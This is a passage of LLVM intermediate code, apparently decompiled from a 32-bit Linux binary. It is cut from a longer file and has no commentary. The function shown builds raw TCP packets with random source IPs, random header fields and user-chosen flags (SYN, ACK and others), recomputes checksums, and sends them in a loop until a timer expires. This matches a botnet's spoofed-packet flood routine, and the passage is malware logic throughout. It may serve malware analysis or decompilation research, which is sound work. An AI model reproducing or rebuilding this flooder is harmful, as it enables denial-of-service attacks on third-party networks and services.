  %v3_804bacc = trunc i32 %v1_804bacc to i8
  store i32 %v1_804bacc, i32* @edx, align 4
  store i8 %v3_804bacc, i8* %v2_804bb72, align 1
  br label %dec_label_pc_804bb7b

dec_label_pc_804bad7:                             ; preds = %dec_label_pc_804ba8d
  store i32 %v4_804ba05, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba05, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055a62.144 to i32), i32* @edi, align 4
  %v6_804bb07 = call i32 @_strncmp(i8* %v3_804bb2a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a62.144, i32 0, i32 0), i32 4)
  %v7_804bb07 = urem i32 %v6_804bb07, 2
  %v8_804bb07 = icmp eq i32 %v7_804bb07, 0
  %v0_804bb09 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb09 = or i1 %v0_804bb09, %v8_804bb07
  %v3_804bb09 = zext i1 %v2_804bb09 to i32
  %v4_804bb09 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb09 = and i32 %v4_804bb09, -256
  %v6_804bb09 = or i32 %v3_804bb09, %v5_804bb09
  %v7_804bb09 = xor i32 %v6_804bb09, 1
  store i32 %v7_804bb09, i32* %edx.global-to-local, align 4
  %v3_804bb0f = and i32 %v6_804bb07, -256
  %v1_804bb11 = trunc i32 %v7_804bb09 to i8
  %v3_804bb11 = zext i1 %v0_804bb09 to i8
  %v4_804bb11 = sub nsw i8 %v1_804bb11, %v3_804bb11
  %v15_804bb11 = icmp eq i8 %v4_804bb11, 0
  %v20_804bb11 = zext i8 %v4_804bb11 to i32
  %v23_804bb11 = or i32 %v20_804bb11, %v3_804bb0f
  store i32 %v23_804bb11, i32* @ecx, align 4
  %v2_804bb15 = sext i8 %v4_804bb11 to i32
  store i32 %v2_804bb15, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb1a = icmp eq i1 %v15_804bb11, false
  br i1 %v1_804bb1a, label %dec_label_pc_804bb2a, label %dec_label_pc_804bb1c

dec_label_pc_804bb1c:                             ; preds = %dec_label_pc_804bad7
  store i32 %v1_804b904, i32* @eax, align 4
  %v3_804bb1f = load i8, i8* %v2_804bb72, align 1
  %v4_804bb1f = zext i8 %v3_804bb1f to i32
  %v7_804bb1f = or i32 %v5_804bb09, %v4_804bb1f
  %v1_804bb22 = or i32 %v7_804bb1f, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb22 = trunc i32 %v1_804bb22 to i8
  store i32 %v1_804bb22, i32* @edx, align 4
  store i8 %v3_804bb22, i8* %v2_804bb72, align 1
  br label %dec_label_pc_804bb7b

dec_label_pc_804bb2a:                             ; preds = %dec_label_pc_804bad7
  store i32 %v4_804ba05, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba05, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055a66.145 to i32), i32* @edi, align 4
  %v6_804bb5a = call i32 @_strncmp(i8* %v3_804bb2a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a66.145, i32 0, i32 0), i32 4)
  %v7_804bb5a = urem i32 %v6_804bb5a, 2
  %v8_804bb5a = icmp eq i32 %v7_804bb5a, 0
  %v0_804bb5c = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb5c = or i1 %v0_804bb5c, %v8_804bb5a
  %v3_804bb5c = zext i1 %v2_804bb5c to i32
  %v4_804bb5c = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb5c = and i32 %v4_804bb5c, -256
  %v6_804bb5c = or i32 %v3_804bb5c, %v5_804bb5c
  %v7_804bb5c = xor i32 %v6_804bb5c, 1
  store i32 %v7_804bb5c, i32* @edx, align 4
  %v3_804bb62 = and i32 %v6_804bb5a, -256
  %v1_804bb64 = trunc i32 %v7_804bb5c to i8
  %v3_804bb64 = zext i1 %v0_804bb5c to i8
  %v4_804bb64 = sub nsw i8 %v1_804bb64, %v3_804bb64
  %v15_804bb64 = icmp eq i8 %v4_804bb64, 0
  %v20_804bb64 = zext i8 %v4_804bb64 to i32
  %v23_804bb64 = or i32 %v20_804bb64, %v3_804bb62
  store i32 %v23_804bb64, i32* @ecx, align 4
  %v2_804bb68 = sext i8 %v4_804bb64 to i32
  store i32 %v2_804bb68, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb6d = icmp eq i1 %v15_804bb64, false
  br i1 %v1_804bb6d, label %dec_label_pc_804bb7b, label %dec_label_pc_804bb6f

dec_label_pc_804bb6f:                             ; preds = %dec_label_pc_804bb2a
  store i32 %v1_804b904, i32* @eax, align 4
  %v3_804bb72 = load i8, i8* %v2_804bb72, align 1
  %v4_804bb72 = zext i8 %v3_804bb72 to i32
  %v7_804bb72 = or i32 %v5_804bb5c, %v4_804bb72
  %v1_804bb75 = or i32 %v7_804bb72, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb75 = trunc i32 %v1_804bb75 to i8
  store i32 %v1_804bb75, i32* @edx, align 4
  store i8 %v3_804bb75, i8* %v2_804bb72, align 1
  br label %dec_label_pc_804bb7b

dec_label_pc_804bb7b:                             ; preds = %dec_label_pc_804bb2a, %dec_label_pc_804bb1c, %dec_label_pc_804bac6, %dec_label_pc_804ba7c, %dec_label_pc_804ba38, %dec_label_pc_804bb6f
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804bb2a ], [ 4, %dec_label_pc_804bb6f ], [ %stack_var_-160.129, %dec_label_pc_804bb1c ], [ %stack_var_-160.129, %dec_label_pc_804bac6 ], [ %stack_var_-160.129, %dec_label_pc_804ba7c ], [ %stack_var_-160.129, %dec_label_pc_804ba38 ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a66.145, i32 0, i32 0), %dec_label_pc_804bb2a ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a66.145, i32 0, i32 0), %dec_label_pc_804bb6f ], [ %stack_var_-156.130, %dec_label_pc_804bb1c ], [ %stack_var_-156.130, %dec_label_pc_804bac6 ], [ %stack_var_-156.130, %dec_label_pc_804ba7c ], [ %stack_var_-156.130, %dec_label_pc_804ba38 ]
  %v0_804bb7b = load i32, i32* @esp, align 4
  %v5_804bb7b = icmp ult i32 %v0_804bb7b, 8
  store i1 %v5_804bb7b, i1* %cf.global-to-local, align 1
  %v1_804bb7e = add i32 %v0_804bb7b, -12
  %v2_804bb7e = inttoptr i32 %v1_804bb7e to i32*
  store i32 ptrtoint (i32* @global_var_8055a54.140 to i32), i32* %v2_804bb7e, align 4
  %v1_804bb83 = add i32 %v0_804bb7b, -16
  %v2_804bb83 = inttoptr i32 %v1_804bb83 to i32*
  store i32 0, i32* %v2_804bb83, align 4
  %v2_804bb85 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804bb85 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804bb85)
  store i32 %v3_804bb85, i32* %eax.global-to-local, align 4
  store i32 %v3_804bb85, i32* %tmp102, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bb90 = icmp eq i32 %v3_804bb85, 0
  %v1_804bb94 = icmp eq i1 %v5_804bb90, false
  %tmp103 = inttoptr i32 %v3_804bb85 to i8*
  br i1 %v1_804bb94, label %dec_label_pc_804ba05, label %dec_label_pc_804bb9a

dec_label_pc_804bb9a:                             ; preds = %dec_label_pc_804bb7b, %dec_label_pc_804b9e9, %dec_label_pc_804b9a8
  %v0_804bb9a = phi i8* [ %v0_804bb9a.pre, %dec_label_pc_804b9a8 ], [ %v5_804b9fd, %dec_label_pc_804b9e9 ], [ %tmp103, %dec_label_pc_804bb7b ]
  %v1_804bb9a = ptrtoint i8* %v0_804bb9a to i32
  %v2_804bb9a = call i32 @rand_cmwc(i32 %v1_804bb9a)
  %sext8 = mul i32 %v2_804bb9a, 65536
  %v1_804bb9f = sdiv i32 %sext8, 65536
  store i32 %v1_804bb9f, i32* %edx.global-to-local, align 4
  %v1_804bba4 = trunc i32 %v1_804bb9f to i16
  %v3_804bba4 = add i32 %v2_804b8ec, 34
  %v4_804bba4 = inttoptr i32 %v3_804bba4 to i16*
  store i16 %v1_804bba4, i16* %v4_804bba4, align 2
  %v1_804bbab = add i32 %v2_804b8ec, 36
  %v2_804bbab = inttoptr i32 %v1_804bbab to i16*
  store i16 0, i16* %v2_804bbab, align 4
  store i32 %v1_804b904, i32* %eax.global-to-local, align 4
  %v1_804bbb4 = add i32 %v2_804b8ec, 38
  %v2_804bbb4 = inttoptr i32 %v1_804bbb4 to i16*
  store i16 0, i16* %v2_804bbb4, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804b807, label %dec_label_pc_804bbcb, label %dec_label_pc_804bbc0

dec_label_pc_804bbc0:                             ; preds = %dec_label_pc_804bb9a
  %v0_804bbc0 = load i8*, i8** %stack_var_-20, align 4
  %v1_804bbc0 = ptrtoint i8* %v0_804bbc0 to i32
  %v2_804bbc0 = call i32 @rand_cmwc(i32 %v1_804bbc0)
  store i32 %v2_804bbc0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bbe3

dec_label_pc_804bbcb:                             ; preds = %dec_label_pc_804bb9a
  %v1_804bbce = urem i32 %arg2, 65536
  store i32 %v1_804bbce, i32* %eax.global-to-local, align 4
  %v0_804bbd3 = load i32, i32* @esp, align 4
  %v5_804bbd3 = icmp ult i32 %v0_804bbd3, 12
  store i1 %v5_804bbd3, i1* %cf.global-to-local, align 1
  %v2_804bbd6 = add i32 %v0_804bbd3, -16
  %v3_804bbd6 = inttoptr i32 %v2_804bbd6 to i32*
  store i32 %v1_804bbce, i32* %v3_804bbd6, align 4
  %v1_804bbd7 = sext i16 %tmp46 to i32
  %v2_804bbd7 = call i32 @htons(i32 %v1_804bbd7)
  store i32 %v2_804bbd7, i32* %eax.global-to-local, align 4
  %v0_804bbdc = load i32, i32* @esp, align 4
  %v2_804bbdc = icmp ugt i32 %v0_804bbdc, -17
  store i1 %v2_804bbdc, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bbe3

dec_label_pc_804bbe3:                             ; preds = %dec_label_pc_804bbc0, %dec_label_pc_804bbcb
  %storemerge.in = phi i32 [ %v2_804bbd7, %dec_label_pc_804bbcb ], [ %v2_804bbc0, %dec_label_pc_804bbc0 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b904, i32* %eax.global-to-local, align 4
  %v4_804bbe6 = urem i32 %storemerge.in, 65536
  %v5_804bbe6 = load i32, i32* @esi, align 4
  %v6_804bbe6 = and i32 %v5_804bbe6, -65536
  %v7_804bbe6 = or i32 %v6_804bbe6, %v4_804bbe6
  store i32 %v7_804bbe6, i32* @esi, align 4
  %v3_804bbea = add i32 %v2_804b8ec, 22
  %v4_804bbea = inttoptr i32 %v3_804bbea to i16*
  store i16 %storemerge, i16* %v4_804bbea, align 2
  %v0_804bbee = load i32, i32* @esp, align 4
  %v5_804bbee = icmp ult i32 %v0_804bbee, 8
  store i1 %v5_804bbee, i1* %cf.global-to-local, align 1
  %v6_804bbf1 = add i32 %v0_804bbee, -12
  %v7_804bbf1 = inttoptr i32 %v6_804bbf1 to i32*
  store i32 %v1_804b904, i32* %v7_804bbf1, align 4
  %v5_804bbf4 = add i32 %v0_804bbee, -16
  %v6_804bbf4 = inttoptr i32 %v5_804bbf4 to i32*
  store i32 %v2_804b8ec, i32* %v6_804bbf4, align 4
  %v0_804bbf7 = call i32 @tcpcsum()
  %v1_804bbf7 = trunc i32 %v0_804bbf7 to i16
  %sext13 = mul i32 %v0_804bbf7, 65536
  %v1_804bbff = sdiv i32 %sext13, 65536
  store i32 %v1_804bbff, i32* %edx.global-to-local, align 4
  store i16 %v1_804bbf7, i16* %v2_804bbab, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  %v1_804bc0b = or i32 %v2_804b8ec, 2
  %v2_804bc0b = inttoptr i32 %v1_804bc0b to i16*
  %v3_804bc0b = load i16, i16* %v2_804bc0b, align 2
  %v4_804bc0b = zext i16 %v3_804bc0b to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bc0b, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  %v1_804bc1a = load i32, i32* @esp, align 4
  %v2_804bc1a = add i32 %v1_804bc1a, -4
  %v3_804bc1a = inttoptr i32 %v2_804bc1a to i32*
  store i32 %v4_804bc0b, i32* %v3_804bc1a, align 4
  %v0_804bc1b = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc1b = add i32 %v1_804bc1a, -8
  %v3_804bc1b = inttoptr i32 %v2_804bc1b to i32*
  store i32 %v0_804bc1b, i32* %v3_804bc1b, align 4
  %sext14 = mul i32 %storemerge.in, 65536
  %v1_804bc1c = sdiv i32 %sext14, 65536
  %v3_804bc1c = inttoptr i32 %v1_804bc1c to i16*
  %v4_804bc1c = call i32 @csum(i16* %v3_804bc1c, i32 ptrtoint (i32* @0 to i32))
  %v5_804bc1c = trunc i32 %v4_804bc1c to i16
  %sext15 = mul i32 %v4_804bc1c, 65536
  %v1_804bc24 = sdiv i32 %sext15, 65536
  store i32 %v1_804bc24, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  %v3_804bc29 = or i32 %v2_804b8ec, 10
  %v4_804bc29 = inttoptr i32 %v3_804bc29 to i16*
  store i16 %v5_804bc1c, i16* %v4_804bc29, align 2
  %v0_804bc2d = load i32, i32* @esp, align 4
  %v5_804bc2d = icmp ult i32 %v0_804bc2d, 12
  store i1 %v5_804bc2d, i1* %cf.global-to-local, align 1
  %v1_804bc30 = add i32 %v0_804bc2d, -16
  %v2_804bc30 = inttoptr i32 %v1_804bc30 to i32*
  store i32 0, i32* %v2_804bc30, align 4
  %v2_804bc32 = inttoptr i32 %v1_804bc1c to i32*
  %v3_804bc32 = call i32 @__GI_time(i32* %v2_804bc32)
  %v0_804bc37 = load i32, i32* @esp, align 4
  %v1_804bc37 = add i32 %v0_804bc37, 16
  %v5_804bc3a = add i32 %v3_804bc32, %arg3
  %v10_804bc3a = icmp ult i32 %v5_804bc3a, %v3_804bc32
  store i1 %v10_804bc3a, i1* %cf.global-to-local, align 1
  store i32 %v5_804bc3a, i32* %eax.global-to-local, align 4
  %v2_804bc85 = or i32 %v2_804b8ec, 12
  %v3_804bc85 = inttoptr i32 %v2_804bc85 to i32*
  %v3_804bc92 = or i32 %v2_804b8ec, 4
  %v4_804bc92 = inttoptr i32 %v3_804bc92 to i16*
  br label %dec_label_pc_804bc49

dec_label_pc_804bc49:                             ; preds = %dec_label_pc_804bd00, %dec_label_pc_804bd1e, %dec_label_pc_804bbe3
  %v0_804bc4f = phi i32 [ %v1_804bc37, %dec_label_pc_804bbe3 ], [ %v0_804bc4f.pre.pre, %dec_label_pc_804bd1e ], [ %v1_804bd0a, %dec_label_pc_804bd00 ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804bbe3 ], [ %v4_804bd1e, %dec_label_pc_804bd1e ], [ 0, %dec_label_pc_804bd00 ]
  store i32 %v2_804b82f, i32* %eax.global-to-local, align 4
  store i32 %v2_804b8ec, i32* %edx.global-to-local, align 4
  %v5_804bc4f = icmp ult i32 %v0_804bc4f, 8
  store i1 %v5_804bc4f, i1* %cf.global-to-local, align 1
  %v1_804bc52 = add i32 %v0_804bc4f, -12
  %v2_804bc52 = inttoptr i32 %v1_804bc52 to i32*
  store i32 16, i32* %v2_804bc52, align 4
  %v2_804bc54 = add i32 %v0_804bc4f, -16
  %v3_804bc54 = inttoptr i32 %v2_804bc54 to i32*
  store i32 %v2_804b82f, i32* %v3_804bc54, align 4
  %v1_804bc55 = add i32 %v0_804bc4f, -20
  %v2_804bc55 = inttoptr i32 %v1_804bc55 to i32*
  store i32 0, i32* %v2_804bc55, align 4
  %v5_804bc57 = add i32 %v0_804bc4f, -24
  %v6_804bc57 = inttoptr i32 %v5_804bc57 to i32*
  store i32 %v1_804b8cc, i32* %v6_804bc57, align 4
  %v0_804bc5a = load i32, i32* %edx.global-to-local, align 4
  %v2_804bc5a = add i32 %v0_804bc4f, -28
  %v3_804bc5a = inttoptr i32 %v2_804bc5a to i32*
  store i32 %v0_804bc5a, i32* %v3_804bc5a, align 4
  %v5_804bc5b = add i32 %v0_804bc4f, -32
  %v6_804bc5b = inttoptr i32 %v5_804bc5b to i32*
  store i32 %v3_804b866, i32* %v6_804bc5b, align 4
  %v1_804bc5e = load i32, i32* %stack_var_-64, align 4
  %v2_804bc5e = load i32, i32* %stack_var_-60, align 4
  %v3_804bc5e = load i32, i32* %stack_var_-56, align 4
  %v4_804bc5e = load i32, i32* %stack_var_-52, align 4
  %v6_804bc5e = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804bc5e, i32 %v2_804bc5e, i32 %v3_804bc5e, i32 %v4_804bc5e, i32 0)
  store i32 %v6_804bc5e, i32* %eax.global-to-local, align 4
  %v0_804bc63 = load i32, i32* @esp, align 4
  %v1_804bc63 = add i32 %v0_804bc63, 32
  %v5_804bc66 = icmp ult i32 %v1_804bc63, 12
  store i1 %v5_804bc66, i1* %cf.global-to-local, align 1
  %v5_804bc69 = add i32 %v0_804bc63, 16
  %v6_804bc69 = inttoptr i32 %v5_804bc69 to i32*
  store i32 %storemerge12, i32* %v6_804bc69, align 4
  %v1_804bc6c = load i32, i32* %stack_var_-64, align 4
  %v2_804bc6c = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804bc6c)
  store i32 %v2_804bc6c, i32* %eax.global-to-local, align 4
  %v0_804bc71 = load i32, i32* @esp, align 4
  %v1_804bc71 = add i32 %v0_804bc71, 16
  %v5_804bc74 = icmp ult i32 %v1_804bc71, 12
  store i1 %v5_804bc74, i1* %cf.global-to-local, align 1
  %v3_804bc77 = inttoptr i32 %v0_804bc71 to i32*
  store i32 %v2_804bc6c, i32* %v3_804bc77, align 4
  %v0_804bc78 = call i32 @htonl()
  %v0_804bc7d = load i32, i32* @esp, align 4
  %v2_804bc7d = icmp ugt i32 %v0_804bc7d, -17
  store i1 %v2_804bc7d, i1* %cf.global-to-local, align 1
  store i32 %v0_804bc78, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  store i32 %v0_804bc78, i32* %v3_804bc85, align 4
  %v1_804bc88 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext9 = mul i32 %v1_804bc88, 65536
  %v1_804bc8d = sdiv i32 %sext9, 65536
  store i32 %v1_804bc8d, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  %v1_804bc92 = trunc i32 %v1_804bc8d to i16
  store i16 %v1_804bc92, i16* %v4_804bc92, align 4
  %v1_804bc96 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804bc96, i32* %edx.global-to-local, align 4
  store i32 %v1_804b904, i32* %eax.global-to-local, align 4
  store i32 %v1_804bc96, i32* %v3_804b959, align 8
  %v1_804bca3 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804bca3, 65536
  %v1_804bca8 = sdiv i32 %sext10, 65536
  store i32 %v1_804bca8, i32* %edx.global-to-local, align 4
  %v1_804bcad = trunc i32 %v1_804bca8 to i16
  store i16 %v1_804bcad, i16* %v5_804b907, align 4
  store i32 %v1_804b904, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804bbab, align 4
  %v0_804bcb9 = load i32, i32* @esp, align 4
  %v5_804bcb9 = icmp ult i32 %v0_804bcb9, 8
  store i1 %v5_804bcb9, i1* %cf.global-to-local, align 1
  %v6_804bcbc = add i32 %v0_804bcb9, -12
  %v7_804bcbc = inttoptr i32 %v6_804bcbc to i32*
  store i32 %v1_804b904, i32* %v7_804bcbc, align 4
  %v5_804bcbf = add i32 %v0_804bcb9, -16
  %v6_804bcbf = inttoptr i32 %v5_804bcbf to i32*
  store i32 %v2_804b8ec, i32* %v6_804bcbf, align 4
  %v0_804bcc2 = call i32 @tcpcsum()
  %v1_804bcc2 = trunc i32 %v0_804bcc2 to i16
  %sext17 = mul i32 %v0_804bcc2, 65536
  %v1_804bcca = sdiv i32 %sext17, 65536
  store i32 %v1_804bcca, i32* %edx.global-to-local, align 4
  store i16 %v1_804bcc2, i16* %v2_804bbab, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  %v3_804bcd6 = load i16, i16* %v2_804bc0b, align 2
  %v4_804bcd6 = zext i16 %v3_804bcd6 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bcd6, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  %v1_804bce5 = load i32, i32* @esp, align 4
  %v2_804bce5 = add i32 %v1_804bce5, -4
  %v3_804bce5 = inttoptr i32 %v2_804bce5 to i32*
  store i32 %v4_804bcd6, i32* %v3_804bce5, align 4
  %v0_804bce6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bce6 = add i32 %v1_804bce5, -8
  %v3_804bce6 = inttoptr i32 %v2_804bce6 to i32*
  store i32 %v0_804bce6, i32* %v3_804bce6, align 4
  %v1_804bce7 = load i32, i32* %stack_var_-64, align 4
  %v2_804bce7 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804bce7 = call i32 @csum(i16* %v2_804bce7, i32 %v1_804bce7)
  %v4_804bce7 = trunc i32 %v3_804bce7 to i16
  %sext18 = mul i32 %v3_804bce7, 65536
  %v1_804bcef = sdiv i32 %sext18, 65536
  store i32 %v1_804bcef, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8ec, i32* %eax.global-to-local, align 4
  store i16 %v4_804bce7, i16* %v4_804bc29, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804bcfb = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804bcfb, i1* %cf.global-to-local, align 1
  %v15_804bcfb = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804bcfe = icmp eq i1 %v15_804bcfb, false
  br i1 %v1_804bcfe, label %dec_label_pc_804bd1e, label %dec_label_pc_804bd00

dec_label_pc_804bd00:                             ; preds = %dec_label_pc_804bc49
  %v0_804bd00 = load i32, i32* @esp, align 4
  %v5_804bd00 = icmp ult i32 %v0_804bd00, 12
  store i1 %v5_804bd00, i1* %cf.global-to-local, align 1
  %v1_804bd03 = add i32 %v0_804bd00, -16
  %v2_804bd03 = inttoptr i32 %v1_804bd03 to i32*
  store i32 0, i32* %v2_804bd03, align 4
  %v1_804bd05 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804bd05 = call i32 @__GI_time(i32* %v1_804bd05)
  store i32 %v2_804bd05, i32* %eax.global-to-local, align 4
  %v0_804bd0a = load i32, i32* @esp, align 4
  %v1_804bd0a = add i32 %v0_804bd0a, 16
  %v10_804bd0d = icmp ult i32 %v2_804bd05, %v5_804bc3a
  store i1 %v10_804bd0d, i1* %cf.global-to-local, align 1
  %v8_804bd10 = icmp sgt i32 %v2_804bd05, %v5_804bc3a
  br i1 %v8_804bd10, label %dec_label_pc_804bd26, label %dec_label_pc_804bc49

dec_label_pc_804bd1e:                             ; preds = %dec_label_pc_804bc49
  %v4_804bd1e = add i32 %stack_var_-68.0, 1
  %v0_804bc4f.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bc49

dec_label_pc_804bd26:                             ; preds = %dec_label_pc_804bd00, %dec_label_pc_804b87c, %dec_label_pc_804b84a, %dec_label_pc_804b82c
  %v0_804bd30 = phi i32 [ %v5_804b893, %dec_label_pc_804b87c ], [ %v3_804b866, %dec_label_pc_804b84a ], [ %v3_804b839, %dec_label_pc_804b82c ], [ %v2_804bd05, %dec_label_pc_804bd00 ]
  store i32 %v0_804b7eb, i32* @ebx, align 4
  store i32 %v0_804b7ea, i32* @esi, align 4
  ret i32 %v0_804bd30

; uselistorder directives
  uselistorder i32 %v2_804bd05, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804bca8, { 1, 0 }
  uselistorder i32 %v1_804bc8d, { 1, 0 }
  uselistorder i32 %v0_804bc78, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804bc4f, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804bc3a, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804bc32, { 1, 0 }
  uselistorder i32 %v1_804bc1c, { 1, 0 }
  uselistorder i32 %v1_804bbce, { 1, 0 }
  uselistorder i32 %v1_804bb9f, { 1, 0 }
  uselistorder i32 %v3_804bb85, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804bb75, { 1, 0 }
  uselistorder i1 %v0_804bb5c, { 1, 0 }
  uselistorder i32 %v6_804bb5a, { 1, 0 }
  uselistorder i32 %v1_804bb22, { 1, 0 }
  uselistorder i1 %v0_804bb09, { 1, 0 }
  uselistorder i32 %v6_804bb07, { 1, 0 }
  uselistorder i32 %v1_804bacc, { 1, 0 }
  uselistorder i1 %v0_804bab3, { 1, 0 }
  uselistorder i32 %v6_804bab1, { 1, 0 }
  uselistorder i32 %v1_804ba82, { 1, 0 }
  uselistorder i1 %v0_804ba69, { 1, 0 }
  uselistorder i32 %v6_804ba67, { 1, 0 }
  uselistorder i32 %v1_804ba3e, { 1, 0 }
  uselistorder i1 %v0_804ba25, { 1, 0 }
  uselistorder i32 %v6_804ba23, { 1, 0 }
  uselistorder i32 %v4_804ba05, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 %stack_var_-160.129, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.130, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804bb2a, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804bb72, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804b9de, { 1, 0 }
  uselistorder i32 %v1_804b9d2, { 1, 0 }
  uselistorder i32 %v1_804b9c6, { 1, 0 }
  uselistorder i32 %v1_804b9ba, { 1, 0 }
  uselistorder i32 %v1_804b9ae, { 1, 0 }
  uselistorder i8* %v2_804b9ab, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804b995, { 1, 0 }
  uselistorder i32 %v6_804b993, { 1, 0 }
  uselistorder i32 %v1_804b947, { 1, 0 }
  uselistorder i32 %v0_804b929, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804b904, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804b8ec, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804b8e1, { 1, 0, 2 }
  uselistorder i32 %v2_804b8c2, { 1, 0 }
  uselistorder i32 %v3_804b866, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_804b817, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 2, 1, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 31, 16, 17, 18, 20, 19, 21, 23, 22, 24, 26, 25, 27, 29, 28, 30, 58, 59, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 -24, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 -20, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bc49, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bbe3, { 1, 0 }
  uselistorder label %dec_label_pc_804bb7b, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804ba05, { 1, 0 }
